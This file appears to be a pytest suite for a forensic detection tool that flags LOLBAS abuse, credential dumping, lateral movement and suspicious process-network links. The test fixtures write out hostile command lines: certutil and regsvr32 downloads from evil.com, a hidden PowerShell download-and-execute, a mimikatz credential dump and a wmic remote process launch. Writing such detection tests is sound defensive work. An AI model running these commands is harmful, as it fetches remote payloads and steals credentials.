"""Sprint 3: LOLBAS, credential, lateral, temporal correlation, confidence scoring."""

import pytest

from glassbox.detect.lolbas import detect_lolbas_abuse
from glassbox.detect.credential import detect_credential_access
from glassbox.detect.lateral import detect_lateral_movement
from glassbox.correlate.temporal import temporal_process_network_correlation
from glassbox.models import Confidence


# ─── LOLBAS ─────────────────────────────────────────────────────────────────

def test_lolbas_certutil_download():
    cls = [{"pid": 1234, "process": "certutil.exe",
            "args": "certutil.exe -urlcache -split -f http://evil.com/payload.exe"}]
    findings = detect_lolbas_abuse(cls, "TE001")
    assert len(findings) == 1
    assert "certutil" in findings[0].title.lower()
    assert findings[0].confidence == Confidence.CONFIRMED


def test_lolbas_powershell_iex():
    cls = [{"pid": 5678, "process": "powershell.exe",
            "args": "powershell.exe -w hidden -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://c2')"}]
    findings = detect_lolbas_abuse(cls, "TE002")
    assert len(findings) == 1
    assert any("T1059.001" == m.technique_id for m in findings[0].attack)


def test_lolbas_clean_process_no_flag():
    cls = [{"pid": 999, "process": "notepad.exe", "args": "notepad.exe C:\\test.txt"}]
    findings = detect_lolbas_abuse(cls, "TE003")
    assert findings == []


def test_lolbas_regsvr32_squiblydoo():
    cls = [{"pid": 2345, "process": "regsvr32.exe",
            "args": "regsvr32.exe /s /u /n /i:http://evil.com/payload.sct scrobj.dll"}]
    findings = detect_lolbas_abuse(cls, "TE004")
    assert len(findings) == 1
    assert any("T1218.010" in m.technique_id for m in findings[0].attack)


# ─── CREDENTIAL ACCESS ───────────────────────────────────────────────────────

def test_credential_event_4648():
    evs = [{"event_id": 4648, "user": "SYSTEM", "payload": "TargetUserName: Administrator"}]
    findings = detect_credential_access(evs, [], "TE010", "TE011")
    assert any("4648" in f.title or "credential" in f.title.lower() for f in findings)
    assert len(findings) >= 1


def test_credential_mimikatz_cmdline():
    cls = [{"pid": 1111, "process": "powershell.exe",
            "args": "powershell.exe sekurlsa::logonpasswords"}]
    findings = detect_credential_access([], cls, "TE010", "TE011")
    assert len(findings) >= 1
    assert any("T1003.001" == m.technique_id for f in findings for m in f.attack)


# ─── LATERAL MOVEMENT ────────────────────────────────────────────────────────

def test_lateral_wmic_remote():
    cls = [{"pid": 2222, "process": "wmic.exe",
            "args": "wmic /node:192.168.1.10 process call create cmd.exe"}]
    findings = detect_lateral_movement([], cls, "TE020", "TE021")
    assert len(findings) >= 1
    assert any("T1047" == m.technique_id for f in findings for m in f.attack)


# ─── TEMPORAL CORRELATION ────────────────────────────────────────────────────

def test_temporal_correlation_pid_match():
    procs = [{"pid": 1640, "name": "reader_sl.exe", "create_time": "2012-07-22 02:42:36"}]
    conns = [{"pid": 1640, "raddr": "41.168.5.140", "rport": 8080}]
    discs = temporal_process_network_correlation(procs, conns, "TE030", "TE031")
    assert len(discs) == 1
    assert discs[0].kind == "temporal_process_network_correlation"
    assert "41.168.5.140" in discs[0].description


def test_temporal_correlation_no_match_private_ip():
    procs = [{"pid": 100, "name": "bad.exe", "create_time": "2012-07-22 02:42:00"}]
    conns = [{"pid": 100, "raddr": "192.168.1.1", "rport": 445}]  # private IP
    discs = temporal_process_network_correlation(procs, conns, "TE040", "TE041")
    assert discs == []


# ─── CONFIDENCE SCORING ──────────────────────────────────────────────────────

def test_confidence_score_set_after_verification(store_and_audit):
    store, audit = store_and_audit
    store.put("TE001", "reader_sl.exe 1640 41.168.5.140", None)
    from glassbox.models import Confidence, EvidenceType, Finding, Provenance, Severity
    from glassbox.util import stable_id
    from glassbox.verify import verify_findings
    f = Finding(
        finding_id=stable_id("F", "score_test"),
        title="Score test finding",
        evidence_type=EvidenceType.MEMORY,
        severity=Severity.HIGH,
        confidence=Confidence.CONFIRMED,
        provenance=[Provenance(tool_exec_id="TE001", tool="mem_netscan", raw_locator="41.168.5.140")],
        source_agent="test",
    )
    result = verify_findings([f], store, ["TE001"], audit=audit)
    assert len(result.verified) == 1
    assert result.verified[0].confidence_score >= 0.7


def test_hallucinated_finding_zero_score(store_and_audit):
    store, audit = store_and_audit
    store.put("TE002", "nothing useful here", None)
    from glassbox.models import Confidence, EvidenceType, Finding, Provenance, Severity
    from glassbox.util import stable_id
    from glassbox.verify import verify_findings
    f = Finding(
        finding_id=stable_id("F", "hallucinated"),
        title="Hallucinated finding",
        evidence_type=EvidenceType.MEMORY,
        severity=Severity.HIGH,
        confidence=Confidence.CONFIRMED,
        provenance=[Provenance(tool_exec_id="TE002", tool="mem_netscan", raw_locator="PHANTOM_VALUE")],
        source_agent="test",
    )
    result = verify_findings([f], store, ["TE002"], audit=audit)
    assert result.quarantined[0].confidence_score == 0.0
